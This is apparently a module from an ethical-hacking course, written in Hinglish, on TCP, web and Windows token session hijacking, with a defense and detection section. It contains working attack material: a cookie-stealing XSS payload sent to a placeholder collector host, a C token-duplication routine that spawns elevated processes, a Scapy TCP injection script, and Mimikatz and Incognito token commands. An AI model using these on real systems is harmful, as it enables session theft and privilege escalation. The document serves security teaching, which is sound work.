# **Session Hijacking & Access Token Manipulation**

### **Advanced Protocol Engineering, Windows Kernel Internals & Enterprise Defense-in-Depth**

---

## **Master Architecture & Roadmap**

+-------------------------------------------------------------------------------------------------------------------------+

|                                    MODULE 11: SESSION HIJACKING & TOKEN MANIPULATION                                    |

+-------------------------------------------------------------------------------------------------------------------------+

|  [01] Theoretical Foundations       --> Spoofing vs Hijacking, Active/Passive Models, 3-Phase Attack Lifecycle         |

|  [02] Network-Layer (L3/L4) TCP/IP  --> TCP State Engine, Sequence Math, The Recursive TCP ACK Storm Loop, RST Injects|

|  [03] Link-Layer On-Path Vectors    --> ARP Cache Poisoning, CAM Table Flooding, Rogue DHCP Gateway Funneling           |

|  [04] Application-Layer (L7) Web    --> Session Fixation 4-Stage Chain, DOM XSS Token Theft, Sidejacking, CRIME/BREACH  |

|  [05] Windows Kernel Access Tokens  --> Token Anatomy, Primary vs Impersonation, 4 Impersonation Levels, Integrity MIC|

|  [06] Win32 Token Manipulation APIs --> OpenProcess -> OpenProcessToken -> DuplicateTokenEx -> CreateProcessWithTokenW |

|  [07] Named Pipe Reflection Exploits--> Named Pipes, SeImpersonatePrivilege, Potato Family Mechanics (PrintSpoofer)     |

|  [08] Tooling & Penetration Testing --> Scapy L4 Injection, Mimikatz token::*, Metasploit Incognito, Burp Sequencer     |

|  [09] Enterprise Defense-in-Depth   --> Cookie Prefixes (__Host-), CSPRNG Entropy, Credential Guard, SIEM Event Telemetry|

+-------------------------------------------------------------------------------------------------------------------------+

---

## **1. Theoretical Foundations & Taxonomy Mapping**

Session management modern stateful aur stateless communications ki backbone hai. Web applications aur operating systems har transaction par user ko re-authenticate karne ke computational overhead ko eliminate karne ke liye **Sessions** aur **Security Access Tokens** maintain karte hain.

       [ AUTHENTICATION ]               ──▶ Verifies identity proof (Password, Certificate, MFA)

              │

              ▼ (Once Authenticated)

       [ SESSION / TOKEN ISSUANCE ]     ──▶ Preserves identity state (TCP SEQ/ACK, Cookie, Windows Token)

              │

              ▼ (Attacker Vector)

       [ SESSION HIJACKING ]            ──▶ Subverts established state; bypasses MFA & credentials entirely!

### **1.1 Spoofing vs. Hijacking: Boundary Distinction**

- **Session Spoofing (Pre-Authentication):** Attacker active session establish hone se _pehle_ forged identity credentials present karta hai, victim banke naya session initiate karne ki koshish karta hai.
- **Session Hijacking (Post-Authentication):** Attacker pehle se established aur authorized channel ko directly hijack ya commandeer karta hai. **Victim already MFA aur credentials verify kar chuka hota hai; attacker simply uske authenticated security context ko inherit kar leta hai.**

### **1.2 Active vs. Passive Hijacking Paradigms**

+───────────────────────────────────+─────────────────────────────────────────────────────────────────────────────+

| Operational Mode                  | Core Execution Mechanics & Network Impact                                   |

+───────────────────────────────────+─────────────────────────────────────────────────────────────────────────────+

| Passive Session Hijacking        | Monitored traffic sniffing without altering packet streams or desynchronizing|

| (Sidejacking / Eavesdropping)    | endpoints. Stolen session identifiers out-of-band use kiye jate hain.       |

+───────────────────────────────────+─────────────────────────────────────────────────────────────────────────────+

| Active Session Hijacking         | Real-time packet injection, sequence number modification, client            |

| (Man-in-the-Middle / Injection)   | desynchronization, aur connection commandeering directly within the wire.    |

+───────────────────────────────────+─────────────────────────────────────────────────────────────────────────────+

### **1.3 The 3-Phase Session Hijacking Execution Model**

[ Phase 1: Tracking & Interception ] ──▶ Sniffs channel, observes 32-bit TCP SEQ/ACK or HTTP Session IDs.

                  │

                  ▼

[ Phase 2: Desynchronization ]        ──▶ Breaks sync between endpoints (DoS against client or resets SEQ state).

                  │

                  ▼

[ Phase 3: Injection & Takeover ]     ──▶ Injects forged packets or bearer tokens; executes commands as victim!

---

## **2. Network-Layer (OSI Layers 3/4) TCP/IP Hijacking Mechanics**

Network-level session hijacking fundamental TCP/IP stack implementation boundaries par strike karta hai.

### **2.1 TCP Connection State & Sequence Prediction Mathematics**

TCP communication (RFC 793) reliability maintain karne ke liye 32-bit **Initial Sequence Numbers (ISN)** use karta hai:

- **Sequence Number (`SEQ`):** Outgoing byte stream offset.
- **Acknowledgment Number (`ACK`):** Agle byte ka offset jo remote receiver expect kar raha hai.

Host A (Client)                                                       Host B (Server)

      │                                                                     │

      │── [1] TCP Data (SEQ = 1000, Length = 50, ACK = 5000) ──────────────▶│ (Receives 50 bytes)

      │                                                                     │

      │◀─ [2] TCP ACK  (SEQ = 5000, ACK = 1050) ────────────────────────────│ (Expects byte 1050 next)

#### **Blind Hijacking & Sliding Window Math:**

Agar attacker return traffic nahi dekh sakta (Blind Hijacking), to usse operating system ke PRNG (Pseudorandom Number Generator) algorithm ke ISN shift ko predict karna padta hai:

ΔSEQ=f(t)\Delta\text{SEQ} = f(t)ΔSEQ=f(t)

Jab tak injected packet ka sequence number receiver ke sliding window ke andar fall karega:

RCV.NXT≤SEQ<RCV.NXT+RCV.WND\text{RCV.NXT} \le \text{SEQ} < \text{RCV.NXT} + \text{RCV.WND}RCV.NXT≤SEQ<RCV.NXT+RCV.WND

Server packet ko authentic accept kar leta hai aur internal buffer commit kar deta hai!

---

### **2.2 The TCP ACK Storm Paradox**

Jab attacker ek active TCP connection me client ko silence kiye bina packet inject karta hai, connection **Desynchronized** ho jata hai:

Attacker                                 Server                                 Legitimate Client

   │                                       │                                            │

   │── [1] Injects Forged Packet ─────────▶│                                            │

   │   (SEQ = SEQA, ACK = ACKA)            │                                            │

   │                                       │── [2] Transmits ACK (ACKS1) ──────────────▶│

   │                                       │   (ACK indicates received injected data)   │

   │                                       │                                            │

   │                                       │◀─ [3] Client receives unexpected ACK! ─────│

   │                                       │   Transmits ACK confirming expected byte   │

   │                                       │   (ACKC1 - Out of sync with Server!)       │

   │                                       │                                            │

   │                                       │── [4] Server receives out-of-sync ACK! ───▶│

   │                                       │   Transmits ACKS2 back to Client...        │

   │                                       │                                            │

   │                                       │◀══════════════════════════════════════════▶│

   │                                       │    RECURSIVE TCP ACK STORM CASCADE!        │

   │                                       │    Client(ACK_Cn) <---> Server(ACK_Sn)     │

   │                                       │    Network Floods with Empty ACKs until    │

   │                                       │    Buffers Exhaust or Connection Resets!   │

Cyclic Loop: Client(ACKCn)⟷Server(ACKSn)\text{Cyclic Loop: } \text{Client}(\text{ACK}_{Cn}) \longleftrightarrow \text{Server}(\text{ACK}_{Sn})Cyclic Loop: Client(ACKCn​)⟷Server(ACKSn​)

> **IDS Alert Trigger:** TCP ACK Storm network link par massive volume me 0-byte ACK packets produce karta hai, jisse Suricata/Snort sensors par instant alert trigger hota hai.

---

### **2.3 TCP Reset (RST) Hijacking & UDP Subversion**

- **TCP RST Hijacking:** Attacker receiver ke sliding window ke andar match hone wala sequence number craft karke `RST` flag assert karta hai. Server socket ko instantly close kar deta hai. Client knock-off hote hi attacker uski IP spoof karke naya connection take over kar leta hai.
- **UDP Session Hijacking:** UDP (DNS, SNMP, TFTP) completely stateless hai—no handshake, no sequence counters. Attacker simply client ka Source IP aur ephemeral source port spoof karke malicious UDP datagram inject kar deta hai.

---

## **3. Link-Layer On-Path Interception Primitives**

On-path positioning establish karne ke liye attacker local network (L2) primitives ko abuse karta hai:

                         +────────────────────────────────────────+

                         |      Layer 2 Interception Arsenal      |

                         +────────────────────────────────────────+

                                             │

            ┌────────────────────────────────┼────────────────────────────────┐

            ▼                                ▼                                ▼

   [ ARP Cache Poisoning ]          [ CAM Table Flooding ]           [ Rogue DHCP Funneling ]

   - Unsolicited Gratuitous ARPs    - macof fills switch memory       - Yersinia exhausts IP pool

   - Re-routes L3 unicast traffic   - Switch falls back to HUB mode   - Rogue DHCP pushes attacker's

   - Target -> Attacker -> Gateway  - All ports receive raw frames   - Gateway & DNS configurations!

---

## **4. Application-Layer (OSI Layer 7) Web Session Hijacking**

HTTP protocol stateless hone ki wajah se web applications user state tracking ke liye **Session Identifiers** (Cookies, JWTs, Bearer Tokens) use karti hain.

### **4.1 Session Fixation: 4-Stage Attack Lifecycle**

Session fixation tab occur hota hai jab web application authentication hone ke baad bhi **Session ID regenerate nahi karti**:

Attacker Browser                     Victim User                          Vulnerable Web App

      │                                   │                                       │

      │── [1] Obtains Unauthenticated ───┼──────────────────────────────────────▶│

      │   Session ID: "SESS_12345"        │                                       │

      │                                   │                                       │

      │── [2] Traps Victim with Fixed ID ─▶│                                      │

      │   (https://target.com/login?sid=SESS_12345)                               │

      │                                   │                                       │

      │                                   │── [3] Victim Logs In with Credentials ─▶ Legitimate Auth!

      │                                   │   App fails to regenerate token!      │ BUT binds account

      │                                   │   Session ID remains "SESS_12345"!    │ to "SESS_12345"!

      │                                   │                                       │

      │── [4] Uses "SESS_12345" Directly ────────────────────────────────────────▶│ Attacker Hijacks

      │   (Full access under Victim's authorized profile without credentials!)    │ Authenticated Session!

### **4.2 DOM-Based Token Theft via Cross-Site Scripting (XSS)**

Jab session cookies par `HttpOnly` flag missing hota hai, victim ke browser me execute hone wala arbitrary JavaScript `document.cookie` read karke out-of-band exfiltrate kar leta hai:

javascript

// Malicious JavaScript Payload executed via Stored/Reflected XSS

(function() {

    var stolenSession = encodeURIComponent(document.cookie);

    var exfilGate = "https://c2-listener.audit.local/collect?data=" + stolenSession;

    // Asynchronously transmit session tokens out-of-band

    navigator.sendBeacon(exfilGate) || (new Image()).src = exfilGate;

})();

### **4.3 Cryptographic Side-Channels: CRIME & BREACH**

- **CRIME (Compression Ratio Info-leak Made Easy):** TLS/SPDY protocol-level DEFLATE compression ko target karta hai. Adaptive plaintext inject karke compressed ciphertext byte size difference observe karta hai, brute-forcing cookies character-by-character.
- **BREACH:** HTTP response body compression (GZIP) ko exploit karta hai, HTTPS responses se anti-CSRF aur authentication secrets extract karta hai.
- **The Forbidden Attack:** TLS connections me AES-GCM mode ke sath cryptographic nonce reuse exploit karta hai, enabling header forgery.

---

## **5. Windows Access Token Architecture & Kernel Internals**

Windows NT operating system me identity, access control, aur privilege enforcement kernel security subsystem **Local Security Authority Subsystem Service (LSASS)** manage karta hai.

+─────────────────────────────────────────────────────────────────────────────+

|                     WINDOWS ACCESS TOKEN DATA STRUCTURE                     |

+─────────────────────────────────────────────────────────────────────────────+

|  User SID               : S-1-5-21-3849102-1002 (Account Security Identifier)|

|  Group SIDs             : Administrators, Authenticated Users, Domain Admins|

|  Privileges Bitmask     : SeDebugPrivilege, SeImpersonatePrivilege, ...     |

|  Logon Session ID (LUID): 0x3E7 (Locally Unique Identifier)                 |

|  Integrity Level (MIC)  : Medium / High / SYSTEM (Mandatory Integrity Marker|

|  Token Type             : Primary Token  OR  Impersonation Token            |

+─────────────────────────────────────────────────────────────────────────────+

### **5.1 Primary Tokens vs. Impersonation Tokens**

- **Primary Tokens:** Strictly **Processes** ke sath associate hote hain. Process creation ke waqt kernel memory me instantiate hote hain. Sirf privileged system processes naya primary token process ko assign kar sakti hain.
- **Impersonation Tokens:** Individual **Threads** ke sath associate hote hain. Ye multi-threaded servers (e.g., IIS, SQL Server) ko permission dete hain ki wo connecting client ki identity temporary adopt karke client ke authorized permissions ke mutabiq local operations execute karein.

### **5.2 The 4 Windows Impersonation Levels**

[ Anonymous ]       ──▶ Server gets NO identity information; client is completely anonymous.

        │

        ▼

[ Identification ]  ──▶ Server can inspect client's SID and privileges, but CANNOT impersonate.

        │

        ▼

[ Impersonation ]   ──▶ Server thread can impersonate client to access LOCAL system objects!

        │

        ▼

[ Delegation ]      ──▶ Server thread can impersonate client locally AND forward credentials

                        to authenticate against REMOTE machines over the network (Kerberos)!

### **5.3 High-Value Privileges for Privilege Escalation**

|Administrative Privilege|Operational Kernel Authority|Exploitation Impact|
|---|---|---|
|**`SeDebugPrivilege`**|Process memory isolation bypass karta hai; kisi bhi process ka memory space read/write kar sakta hai.|Directly open `lsass.exe` to dump LSASS memory handles or duplicate tokens from `winlogon.exe`.|
|**`SeImpersonatePrivilege`**|Service account ko connecting client ki security context impersonate karne ki permission deta hai.|Named Pipe Potato exploits (SweetPotato, PrintSpoofer) se direct SYSTEM elevation!|
|**`SeAssignPrimaryTokenPrivilege`**|Naye child process ko customized primary token assign karne ki permission deta hai.|Allows unprivileged service to spawn interactive SYSTEM command shell.|

---

## **6. Win32 API Execution Pipelines & Token Manipulation Mechanics**

Windows kernel me token abuse standard Win32 security APIs ke programmatic sequencing par depend karta hai:

[ 1. OpenProcess ] ──▶ [ 2. OpenProcessToken ] ──▶ [ 3. DuplicateTokenEx ] ──▶ [ 4. Execution Assertion ]

 PROCESS_QUERY_INFO     TOKEN_DUPLICATE / QUERY       Duplicate Token Object       ImpersonateLoggedOnUser (Thread)

                                                                                   OR CreateProcessWithTokenW (Process)

### **6.1 Token Duplication & Process Creation Routine (C/Win32)**

Privileged process (e.g., PID of `winlogon.exe`) se token duplicate karke elevated shell spawn karne ka API flow:

cpp

#include <windows.h>

#include <stdio.h>

BOOL SpawnElevatedProcess(DWORD targetPid, LPCWSTR appPath) {

    HANDLE hProcess = NULL;

    HANDLE hToken = NULL;

    HANDLE hDupToken = NULL;

    STARTUPINFO si;

    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(STARTUPINFO));

    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    si.cb = sizeof(STARTUPINFO);

    // Step 1: Open handle to target elevated process

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);

    if (!hProcess) {

        printf("[-] Failed to open process. Error: %lu\n", GetLastError());

        return FALSE;

    }

    // Step 2: Extract Token Handle from target process

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {

        printf("[-] Failed to open process token. Error: %lu\n", GetLastError());

        CloseHandle(hProcess);

        return FALSE;

    }

    // Step 3: Duplicate token into a Primary Token

    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {

        printf("[-] DuplicateTokenEx failed. Error: %lu\n", GetLastError());

        CloseHandle(hToken);

        CloseHandle(hProcess);

        return FALSE;

    }

    // Step 4: Spawn new process under duplicated SYSTEM/Admin token

    if (!CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, appPath, NULL, 0, NULL, NULL, &si, &pi)) {

        printf("[-] CreateProcessWithTokenW failed. Error: %lu\n", GetLastError());

        CloseHandle(hDupToken);

        CloseHandle(hToken);

        CloseHandle(hProcess);

        return FALSE;

    }

    printf("[+] Successfully spawned elevated process with PID: %lu\n", pi.dwProcessId);

    CloseHandle(pi.hProcess);

    CloseHandle(pi.hThread);

    CloseHandle(hDupToken);

    CloseHandle(hToken);

    CloseHandle(hProcess);

    return TRUE;

}

---

### **6.2 Named Pipe Impersonation & The Potato Exploit Family**

Service accounts (e.g., `NT AUTHORITY\NETWORK SERVICE` ya `LOCAL SERVICE` inside IIS/SQL) ke pass default **`SeImpersonatePrivilege`** hota hai.

[ Attacker Service Shell ] (Has SeImpersonatePrivilege)

           │

           ├── [1] Creates Local Named Pipe: \\.\pipe\audit_pipe

           │

           ├── [2] Triggers Local RPC / Spooler (PrintSpoofer via RpcRemoteFindFirstPrinterChangeNotificationEx)

           │       Tricks NT AUTHORITY\SYSTEM into connecting to the Named Pipe!

           │

           ├── [3] Named Pipe Receives SYSTEM Connection!

           │

           ├── [4] Calls ImpersonateNamedPipeClient() API ──▶ Copies SYSTEM context onto current thread!

           │

           └── [5] Calls DuplicateTokenEx + CreateProcessWithTokenW ──▶ DROPS PERSISTENT SYSTEM SHELL!

---

## **7. Assessment Tooling Ecosystem & Practical Testing Workflows**

+───────────────────────────+─────────────────────────────────────────────────────────────────────────────────+

| Tool / Utility            | Operational Target & Exploitation Scope                                         |

+───────────────────────────+─────────────────────────────────────────────────────────────────────────────────+

| Scapy (Python)            | L4: Custom TCP/IP packet construction, SEQ prediction auditing, RST injection.   |

| Mimikatz                  | Host: Windows Access Token enumeration, duplication, and elevation.            |

| Metasploit (Incognito)    | Host: In-memory token stealing and impersonation across Active Directory users.  |

| Burp Suite (Sequencer)    | L7: Statistical randomness and entropy testing of web application session tokens|

+───────────────────────────+─────────────────────────────────────────────────────────────────────────────────+

### **7.1 Python Scapy: TCP Desynchronization & Injection Script**

python

#!/usr/bin/env python3

"""

TCP Session Desynchronization & Packet Injection Auditor

Inspects live TCP streams, sniffs valid SEQ/ACK numbers, and injects payload.

"""

from scapy.all import sniff, IP, TCP, Raw, send

import sys

TARGET_IP = "192.168.1.50"

TARGET_PORT = 23  # Telnet or Cleartext Protocol

def audit_and_inject(packet):

    if packet.haslayer(TCP) and packet.haslayer(IP):

        if packet[IP].src == TARGET_IP and packet[TCP].sport == TARGET_PORT:

            # Extract current synchronization state parameters

            current_seq = packet[TCP].seq

            current_ack = packet[TCP].ack

            src_ip = packet[IP].src

            dst_ip = packet[IP].dst

            src_port = packet[TCP].sport

            dst_port = packet[TCP].dport

            print(f"[*] Intercepted Active Session: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")

            print(f"    Current SEQ: {current_seq} | Current ACK: {current_ack}")

            # Craft injection segment targeting the server

            injection_payload = "\n/bin/touch /tmp/pwned_audit\n"

            forged_pkt = IP(src=dst_ip, dst=src_ip) / \

                         TCP(sport=dst_port, dport=src_port, seq=current_ack, ack=current_seq + len(packet[TCP].payload), flags="PA") / \

                         Raw(load=injection_payload)

            send(forged_pkt, verbose=0)

            print("[+] Injected desynchronizing command into TCP stream!")

            sys.exit(0)

if __name__ == "__main__":

    print("[*] Sniffing for established TCP connection to audit...")

    sniff(filter=f"host {TARGET_IP} and port {TARGET_PORT}", prn=audit_and_inject, count=10)

### **7.2 Mimikatz & Incognito Token Commands**

powershell

# Mimikatz Access Token Exploitation Module

privilege::debug

token::whoami

token::list

token::elevate /authority:system

token::revert

# Metasploit Meterpreter Incognito Extension

meterpreter > use incognito

meterpreter > list_tokens -u

meterpreter > impersonate_token "CORP\\Administrator"

meterpreter > getuid

---

## **8. Enterprise Defense-in-Depth & Hardening Architectures**

Session hijacking aur token manipulation ko neutralize karne ke liye defense application, network, aur operating system teeno layers par implement karni padti hai:

                                  +──────────────────────────────────+

                                  |    DEFENSE-IN-DEPTH HARDENING    |

                                  +──────────────────────────────────+

                                                    │

             ┌──────────────────────────────────────┼──────────────────────────────────────┐

             ▼                                      ▼                                      ▼

   [ Application Session Layer ]           [ Network Transport Layer ]            [ OS & Kernel Architecture ]

   - Cryptographic CSPRNG Tokens          - Mandatory TLS 1.3 + HSTS             - Virtualization-Based Security (VBS)

   - Mandatory Auth Regeneration          - Cisco Dynamic ARP Inspection (DAI)   - Credential Guard (LSASS Isolation)

   - Strict Cookie Flags & Prefixes       - DHCP Snooping Binding Verification   - Revoke SeImpersonatePrivilege

### **8.1 Application Hardening: Modern Cookie Attributes & Prefixes**

http

HTTP/1.1 200 OK

Set-Cookie: __Host-SessionId=a7c8b9d0e1f234567890abcdef123456; Path=/; Secure; HttpOnly; SameSite=Strict

- **`HttpOnly`:** Client-side JavaScript (`document.cookie`) access completely block karta hai; eliminates DOM-based XSS theft.
- **`Secure`:** Enforces transmission exclusively over encrypted TLS connections.
- **`SameSite=Strict`:** Cross-site navigation par cookies strip karta hai; eliminates CSRF and cross-origin hijacking.
- **`__Host-` Prefix:** Enforces that the cookie:
    1. Must only be set via HTTPS.
    2. Must include `Path=/`.
    3. Must NOT include a domain attribute (cannot be sent to subdomains, eliminating cross-subdomain poisoning).

### **8.2 Windows Kernel Hardening: Credential Guard & Privilege Deprivation**

1. **Virtualization-Based Security (VBS) & Credential Guard:**
    - LSASS process ko Hyper-V hypervisor ke protected **Virtual Secure Mode (VSM)** enclave me isolate karta hai.
    - Host administrator ya SYSTEM processes bhi LSASS process memory me inject karke access tokens ya hashes dump nahi kar sakte.
2. **Depriving Service Account Privileges:**
    - Dedicated virtual service accounts ya Group Managed Service Accounts (gMSA) deploy karein.
    - Non-system services se explicitly **`SeImpersonatePrivilege`** aur **`SeDebugPrivilege`** revoke karein via Local Security Policy (`secpol.msc`).

### **8.3 SIEM Detection Telemetry Matrix**

|Event Source|Event ID|Telemetry Description & Detection Logic|
|---|---|---|
|**Windows Security**|**`4624`**|**Successful Logon:** Alert on Logon Type 9 (`NewCredentials`) or unexpected Type 3 (`Network`) logins from service accounts.|
|**Windows Security**|**`4672`**|**Special Privileges Assigned:** Monitored when administrative rights (`SeDebugPrivilege`, `SeImpersonatePrivilege`) are claimed.|
|**Windows Security**|**`4673`**|**Privileged Service Called:** Alerts when privileged Win32 APIs are executed by unusual processes.|
|**PowerShell Script Block**|**`4104`**|Detects execution of scripts containing `DuplicateTokenEx`, `CreateProcessWithTokenW`, or `ImpersonateNamedPipeClient`.|

---

## **20-Module Masterclass Progress Tracker**

|Module #|Module Title / Subject|Status|
|---|---|---|
|**01**|Introduction to Ethical Hacking & Web Fundamentals|**Completed**|
|**02**|Footprinting & Reconnaissance|**Completed**|
|**03**|Scanning Networks|**Completed**|
|**04**|Enumeration (SMB, LDAP, SNMP, RPC)|**Completed**|
|**05**|Vulnerability Analysis|**Completed**|
|**06**|System Hacking & AD Exploitation|**Completed**|
|**07**|Malware Threats & Dynamic Analysis|**Completed**|
|**08**|Sniffing & Deep Wire Forensics|**Completed**|
|**09**|Social Engineering & Phishing Infrastructure|**Completed**|
|**10**|Denial-of-Service (DoS / DDoS)|**Completed**|
|**11**|**Session Hijacking & Token Manipulation**|**COMPLETED**|
|**12**|Evading IDS, Firewalls, and Honeypots|⏳ _Next in Queue_|
|**13**|Hacking Web Servers|⏳ _Pending_|
|**14**|Hacking Web Applications|⏳ _Pending_|
|**15**|SQL Injection|⏳ _Pending_|
|**16**|Hacking Wireless Networks|⏳ _Pending_|
|**17**|Hacking Mobile Platforms|⏳ _Pending_|
|**18**|IoT & OT Hacking|⏳ _Pending_|
|**19**|Cloud Computing Security|⏳ _Pending_|
|**20**|Cryptography & PKI|⏳ _Pending_|